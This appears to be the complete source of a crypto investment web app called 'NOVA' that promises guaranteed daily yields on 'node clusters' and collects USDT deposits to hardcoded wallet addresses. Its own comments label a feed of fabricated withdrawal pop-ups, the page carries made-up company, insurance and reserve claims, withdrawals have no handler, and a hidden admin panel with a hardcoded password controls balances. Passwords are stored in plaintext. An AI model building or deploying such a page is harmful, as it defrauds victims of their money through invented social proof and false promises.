<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Asset Protocol</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #020617; --accent: #10B981; --card-bg: #0F172A; --text-main: #F8FAFC; --text-dim: #94A3B8; --gold: #F59E0B; --danger: #EF4444; --elite: #8B5CF6; }
        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--primary); color: var(--text-main); overflow-x: hidden; padding-bottom: 100px; }
        
        /* FAKE POPUP NOTIFICATION */
        #notification-box {
            position: fixed; bottom: 100px; left: 20px; z-index: 9999;
            background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px);
            border: 1px solid var(--accent); border-radius: 15px; padding: 12px 18px;
            display: flex; align-items: center; gap: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            transform: translateX(-150%); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        #notification-box.show { transform: translateX(0); }
        .notif-icon { background: var(--accent); color: white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }

        .glass-card { background: var(--card-bg); border-radius: 28px; padding: 20px; margin: 15px; border: 1px solid rgba(255,255,255,0.05); }
        .ticker { background: #000; color: var(--accent); padding: 8px; font-size: 10px; text-align: center; border-bottom: 1px solid #1e293b; font-weight: 600; }
        .app-header { padding: 15px 20px; background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        
        .bal-hero { background: linear-gradient(135deg, #10B981, #064e3b); border-radius: 32px; padding: 30px; margin: 15px; position: relative; overflow: hidden; box-shadow: 0 15px 30px rgba(16, 185, 129, 0.2); }
        .node-card { background: linear-gradient(145deg, #1e293b, #0f172a); border-radius: 25px; padding: 18px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 20px; position: relative; }
        .node-img { width: 100%; height: 140px; border-radius: 18px; object-fit: cover; margin-bottom: 12px; }
        
        .btn-prime { width: 100%; padding: 16px; background: var(--accent); color: white; border: none; border-radius: 18px; font-weight: 900; cursor: pointer; transition: 0.3s; }
        input { width: 100%; padding: 15px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 15px; box-sizing: border-box; margin-bottom: 10px; outline: none; }
        
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #1e293b; z-index: 1000; }
        .nav-item { text-align: center; color: var(--text-dim); font-size: 11px; flex: 1; cursor: pointer; }
        .nav-item.active { color: var(--accent); }
        .nav-item i { font-size: 1.4rem; margin-bottom: 4px; }

        .screen { display: none; animation: slideUp 0.4s ease-out; }
        .screen.active { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        details summary { list-style: none; cursor: pointer; font-weight: 600; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); color: var(--text-main); font-size: 14px; }
        details p { color: var(--text-dim); font-size: 12px; line-height: 1.6; padding: 10px 0; }
    </style>
</head>
<body>

    <div id="notification-box">
        <div class="notif-icon"><i class="fa-solid fa-bolt"></i></div>
        <div>
            <div id="notif-text" style="font-size: 11px; font-weight: 900; color: white;"></div>
            <div id="notif-sub" style="font-size: 9px; color: var(--accent);">Real-time Sync</div>
        </div>
    </div>

    <div class="ticker"><marquee>NOVA WORLDWIDE v15.0 FINAL | SECURE SSL ACTIVE | SINGAPORE NODE ONLINE | $450M ASSETS UNDER MANAGEMENT</marquee></div>

    <div id="auth-screen" style="min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; background: radial-gradient(circle at top right, #1e1b4b, #020617); padding:20px;">
        <i class="fa-solid fa-gem" style="font-size: 4rem; color: var(--accent); margin-bottom: 10px; filter: drop-shadow(0 0 10px var(--accent));"></i>
        <h1 style="letter-spacing:10px; margin:0 0 20px 0; font-weight: 900;">NOVA</h1>
        <div class="glass-card" style="width: 100%; max-width: 380px; margin:0;">
            <input type="text" id="username" placeholder="Operator ID">
            <input type="password" id="password" placeholder="Secure Passkey">
            <button class="btn-prime" onclick="handleAuth()" id="authBtn">INITIALIZE SESSION</button>
            <p onclick="toggleAuth()" id="toggleTxt" style="text-align:center; font-size:12px; color:var(--accent); margin-top:20px; cursor:pointer; font-weight:600;">CREATE NEW ACCOUNT</p>
        </div>
        <div style="margin-top:30px; text-align:center; font-size:10px; color:var(--text-dim);">
            <i class="fa-solid fa-shield-halved"></i> Secured by AES-256 Encryption<br>
            Official Node: #SG-NODE-944
        </div>
    </div>

    <div id="app-main" style="display:none;">
        <div class="app-header">
            <div style="display:flex; align-items:center; gap:10px;">
                <div id="userDisp" style="background:var(--accent); color:white; padding:6px 15px; border-radius:12px; font-weight:900; font-size:13px;">User</div>
            </div>
            <div style="display:flex; gap:15px; align-items:center;">
                <button onclick="claimBonus()" style="background:var(--gold); border:none; border-radius:10px; padding:6px 12px; font-size:10px; font-weight:900; color:black;">DAILY BONUS</button>
                <i class="fa-solid fa-power-off" onclick="location.reload()" style="color:var(--danger); font-size:1.2rem;"></i>
            </div>
        </div>

        <div id="home" class="screen active">
            <div class="bal-hero">
                <small style="text-transform:uppercase; font-weight:900; letter-spacing:1px; opacity:0.8;">Liquid Valuation</small>
                <h1 style="font-size:3.5rem; margin:5px 0; font-weight:900;" id="mainBal">$0.00</h1>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:20px; border-top:1px solid rgba(255,255,255,0.15); padding-top:20px;">
                    <div><small style="display:block; opacity:0.8; font-size:10px;">DAILY PROFIT</small><b id="dayYield" style="font-size:1.2rem;">+$0.00</b></div>
                    <div><small style="display:block; opacity:0.8; font-size:10px;">TOTAL EARNED</small><b id="totProfit" style="font-size:1.2rem;">$0.00</b></div>
                </div>
            </div>

            <div class="glass-card" style="padding:15px; border:1px solid var(--elite); margin-top:-5px;">
                <div style="display:flex; gap:10px;">
                    <input type="text" id="promoInput" placeholder="Promo Code" style="margin:0; font-size:12px;">
                    <button onclick="applyPromo()" style="background:var(--elite); border:none; color:white; border-radius:12px; padding:0 20px; font-weight:900;">APPLY</button>
                </div>
            </div>

            <div class="glass-card" style="padding:15px;">
                <small style="color:var(--text-dim); font-size:10px; font-weight:900;">AFFILIATE LINK</small>
                <div style="display:flex; gap:10px; margin-top:5px;">
                    <input type="text" id="refLink" readonly style="margin:0; font-size:11px; background:#000; border:none;">
                    <button onclick="copyRef()" style="background:var(--accent); border:none; color:white; border-radius:12px; padding:0 15px;"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>

            <h3 style="padding:10px 20px 0;"><i class="fa-solid fa-microchip" style="color:var(--accent);"></i> Cluster Selection</h3>
            <div id="nodeGrid" style="padding: 15px;"></div>
        </div>

        <div id="wallet" class="screen">
            <div class="glass-card">
                <h2 style="color:var(--accent); margin-top:0;">DEPOSIT</h2>
                <p style="font-size:11px; color:var(--text-dim); margin-bottom:15px;">Send USDT (BEP20) or TRX to the wallets below and submit proof.</p>
                <div style="display:flex; gap:10px; margin-bottom:20px;">
                    <div onclick="copyWal('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" style="flex:1; background:#020617; padding:15px; border-radius:18px; text-align:center; border:1px solid #334155;"><i class="fa-solid fa-shield-heart" style="color:#3375BB; font-size:1.8rem;"></i><br><small>TRUST</small></div>
                    <div onclick="copyWal('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" style="flex:1; background:#020617; padding:15px; border-radius:18px; text-align:center; border:1px solid #334155;"><i class="fa-solid fa-mask" style="color:#F6851B; font-size:1.8rem;"></i><br><small>METAMASK</small></div>
                </div>
                <input type="number" id="depAmt" placeholder="Amount (USD)">
                <input type="text" id="tid" placeholder="Transaction ID / Hash">
                <input type="file" id="proof" style="padding:12px; font-size:10px;">
                <button class="btn-prime" onclick="submitDep()">SUBMIT DEPOSIT</button>
            </div>
            <div class="glass-card">
                <h2 style="color:var(--danger); margin-top:0;">WITHDRAW</h2>
                <input type="number" id="witAmt" placeholder="Minimum $10">
                <input type="text" id="witAcc" placeholder="Wallet Address (USDT/TRX)">
                <button class="btn-prime" style="background:var(--danger);" onclick="submitWit()">REQUEST WITHDRAWAL</button>
            </div>
        </div>

        <div id="info" class="screen">
            <div class="glass-card" style="border-left:4px solid var(--accent);">
                <h3 style="margin-top:0; color:var(--accent);">Corporate Profile</h3>
                <p style="font-size:12px; color:var(--text-dim); line-height:1.6;">
                    <b>NOVA Asset Group Ltd.</b> is a premium infrastructure firm registered <b>#SG-94419</b> in Singapore. 
                    We leverage institutional-grade hardware to provide guaranteed yields via the <b>Liquidity Protection Fund (LPF)</b>.
                </p>
            </div>
            <div class="glass-card">
                <h3 style="margin-top:0;">F.A.Q</h3>
                <details><summary>How to activate a node?</summary><p>Deposit funds via the Wallet. Once approved, select a node cluster and click Activate.</p></details>
                <details><summary>Is my capital safe?</summary><p>Yes, NOVA uses a 1:1 reserve ratio backed by our insurance partners in Singapore.</p></details>
                <details><summary>What is the minimum withdrawal?</summary><p>Minimum withdrawal is $10. Processing time is 1-12 hours.</p></details>
            </div>
            <div class="glass-card" style="background:transparent; border:1px dashed rgba(255,255,255,0.1);">
                <h4 style="margin:0;"><i class="fa-solid fa-lock"></i> Privacy Policy</h4>
                <p style="font-size:11px; color:var(--text-dim);">We use end-to-end encryption. All user data is purged upon session termination. Your security is our #1 priority.</p>
            </div>
            <p style="text-align:center; font-size:10px; color:var(--text-dim);">© 2026 NOVA OMNIVERSAL PROTOCOL</p>
        </div>

        <div class="bottom-nav">
            <div class="nav-item active" onclick="navTo('home', this)"><i class="fa-solid fa-house"></i><br>Home</div>
            <div class="nav-item" onclick="navTo('wallet', this)"><i class="fa-solid fa-wallet"></i><br>Wallet</div>
            <div class="nav-item" onclick="navTo('info', this)"><i class="fa-solid fa-shield-halved"></i><br>Trust</div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, query, where, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let user = null; let bal = 0; let isLogin = true;

        // FAKE POPUP NOTIFICATIONS (25+ Entries)
        const names = ["Ahmed", "Sara", "John", "Fatima", "Ali", "David", "Emma", "Maria", "Omar", "Linda", "Sofia", "Amir", "Elena", "Karan", "Priya", "Lucas", "Hassan", "Ayesha", "Viktor", "Zoe", "Musa", "Isabella", "Chen", "Yuki", "Kevin"];
        const actions = ["withdrew $450", "activated Quantum-V2", "deposited $1000", "received $50 bonus", "withdrew $120", "just joined!", "activated Cluster-X1", "earned $80 today"];
        
        function showFakeNotif() {
            const name = names[Math.floor(Math.random() * names.length)];
            const action = actions[Math.floor(Math.random() * actions.length)];
            document.getElementById('notif-text').innerText = `${name} ${action}`;
            const box = document.getElementById('notification-box');
            box.classList.add('show');
            setTimeout(() => { box.classList.remove('show'); }, 4000);
        }
        setInterval(showFakeNotif, 12000);

        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('authBtn').innerText = isLogin ? "INITIALIZE SESSION" : "REGISTER OPERATOR";
            document.getElementById('toggleTxt').innerText = isLogin ? "CREATE NEW ACCOUNT" : "ALREADY HAVE AN ACCOUNT?";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("All fields required!");
            const snap = await getDoc(doc(db, "users", u));
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) { sessionStorage.setItem("nova_user", u); location.reload(); }
                else alert("Access Denied: Invalid Credentials");
            } else {
                if(snap.exists()) return alert("User already registered!");
                await setDoc(doc(db, "users", u), { password: p, balance: 0, dailyProfit: 0, totalProfit: 0, lastBonus: "" });
                alert("Success! Please login now, sweetie."); toggleAuth();
            }
        };

        window.claimBonus = async () => {
            const snap = await getDoc(doc(db, "users", user));
            const today = new Date().toDateString();
            if(snap.data().lastBonus === today) return alert("Already claimed today, sweetie! Check back tomorrow.");
            await updateDoc(doc(db, "users", user), { balance: bal + 0.50, lastBonus: today });
            alert("Daily Bonus +$0.50 credited to your account!"); location.reload();
        };

        window.applyPromo = async () => {
            const code = document.getElementById('promoInput').value.trim();
            const pSnap = await getDoc(doc(db, "promos", code));
            if(pSnap.exists() && pSnap.data().status === "Active") {
                const reward = pSnap.data().value;
                await updateDoc(doc(db, "users", user), { balance: bal + reward });
                alert(`Promo Applied! +$${reward} added.`); location.reload();
            } else alert("Invalid or Expired Code!");
        };

        function renderNodes() {
            const grid = document.getElementById('nodeGrid');
            const data = [
                {name: "Cluster-X1", cost: 30, daily: 1.5, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400"},
                {name: "Quantum-V2", cost: 500, daily: 28, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400"},
                {name: "Titan-Elite", cost: 5000, daily: 350, img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400"}
            ];
            data.forEach(n => {
                grid.innerHTML += `<div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <b style="font-size:1.1rem;">${n.name}</b> 
                        <b style="color:var(--accent); font-size:1.2rem;">$${n.cost}</b>
                    </div>
                    <p style="font-size:11px; color:var(--text-dim); margin:8px 0 15px 0;">
                        Daily Yield: $${n.daily} | Cycle: 30 Days | Insurance: 100%
                    </p>
                    <button class="btn-prime" onclick="buyNode(${n.cost}, '${n.name}')">ACTIVATE CLUSTER</button>
                </div>`;
            });
        }

        window.buyNode = async (cost, name) => {
            if(bal < cost) return alert("Insufficient Liquidity! Please deposit first.");
            if(confirm(`Confirm activation of ${name} for $${cost}?`)) {
                await updateDoc(doc(db, "users", user), { balance: bal - cost });
                await setDoc(doc(db, "transactions", "buy_"+Date.now()), { user, type: "Activation", amount: cost, node: name, status: "Success", date: new Date().toLocaleString() });
                alert("Cluster Sync Successful! 🚀"); location.reload();
            }
        };

        window.submitDep = async () => {
            const amt = document.getElementById('depAmt').value;
            const tid = document.getElementById('tid').value;
            const file = document.getElementById('proof').files[0];
            if(!amt || !tid || !file) return alert("Please fill all details!");
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "transactions", "dep_"+Date.now()), { user, type: "Deposit", amount: amt, tid, proof: reader.result, status: "Pending", date: new Date().toLocaleString() });
                alert("Deposit log submitted for verification!"); location.reload();
            };
            reader.readAsDataURL(file);
        };

        window.navTo = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            if(el) { document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); el.classList.add('active'); }
        };

        async function init() {
            user = sessionStorage.getItem("nova_user");
            if(!user) return;
            document.getElementById('auth-screen').style.display='none';
            document.getElementById('app-main').style.display='block';
            document.getElementById('userDisp').innerText = user.toUpperCase();
            document.getElementById('refLink').value = window.location.origin + window.location.pathname + "?ref=" + user;
            const snap = await getDoc(doc(db, "users", user));
            bal = snap.data().balance;
            document.getElementById('mainBal').innerText = "$" + bal.toFixed(2);
            document.getElementById('dayYield').innerText = "+$" + (snap.data().dailyProfit || 0).toFixed(2);
            document.getElementById('totProfit').innerText = "$" + (snap.data().totalProfit || 0).toFixed(2);
            renderNodes();
        }

        // SUPER ADMIN PANEL (5 Clicks on User Chip)
        document.getElementById('userDisp').onclick = async () => {
            window.adCl = (window.adCl || 0) + 1;
            if(window.adCl === 5) {
                const pass = prompt("ADMIN MASTER KEY:");
                if(pass === "boss786") {
                    const txs = await getDocs(collection(db, "transactions"));
                    let h = `<div style="background:#020617; min-height:100vh; padding:20px; color:white; font-size:12px;">
                    <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; margin-bottom:20px; border-radius:8px;">EXIT ADMIN</button>
                    <h1>GOD PANEL</h1><hr>
                    <h3>GENERATE PROMO</h3><input id="pc" placeholder="Code"> <input id="pv" type="number" placeholder="Value"> <button onclick="window.genP()">GENERATE</button><hr>
                    <h3>PENDING TASKS</h3>`;
                    txs.forEach(t => {
                        const d = t.data();
                        h += `<div class="glass-card" style="background:#1e293b;">${d.user} | ${d.type} | $${d.amount} | ${d.status}<br>
                        ${d.proof ? `<img src="${d.proof}" width="120" style="margin-top:10px;" onclick="window.open(this.src)">` : ''}<br>
                        <button onclick="window.appr('${d.user}', '${d.amount}', '${t.id}')" style="background:green; color:white; border:none; padding:8px; margin-top:5px;">APPROVE</button>
                        <button onclick="window.delTx('${t.id}')" style="background:red; color:white; border:none; padding:8px;">DELETE</button></div>`;
                    });
                    document.body.innerHTML = h + `</div>`;
                } window.adCl = 0;
            }
        };

        window.genP = async () => {
            const c = document.getElementById('pc').value; const v = parseFloat(document.getElementById('pv').value);
            await setDoc(doc(db, "promos", c), { value: v, status: "Active" }); alert("Promo Created Successfully!");
        };
        window.appr = async (uid, amt, tid) => {
            const r = doc(db, "users", uid); const s = await getDoc(r);
            await updateDoc(r, { balance: (s.data().balance || 0) + parseFloat(amt) });
            await updateDoc(doc(db, "transactions", tid), { status: "Success" }); alert("Transaction Approved!"); location.reload();
        };
        window.delTx = async (id) => { if(confirm("Delete this log?")) { await deleteDoc(doc(db, "transactions", id)); location.reload(); } };
        window.copyWal = (a) => { navigator.clipboard.writeText(a); alert("Wallet Address Copied, sweetie!"); };
        window.copyRef = () => { const l = document.getElementById('refLink'); l.select(); navigator.clipboard.writeText(l.value); alert("Referral link copied!"); };
        
        init();
    </script>
</body>
</html>
